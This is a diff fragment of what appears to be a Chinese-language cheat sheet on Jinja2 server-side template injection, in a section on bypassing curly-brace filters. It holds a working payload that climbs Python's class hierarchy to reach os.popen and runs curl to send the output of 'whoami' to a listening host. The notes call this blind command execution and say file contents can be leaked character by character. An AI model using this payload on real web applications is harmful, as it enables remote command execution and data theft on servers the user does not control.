@@ -92,7 +92,7 @@ request.__class__.__mro__.__getitem__(8)
 ##### 过滤大括号
 
 ```
-利用{%%}标记
+利用标记
 {% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}1{% endif %}
 相当于盲命令执行，利用curl将执行结果带出来
 读取文件可以利用盲注的方法逐位将内容爆出来
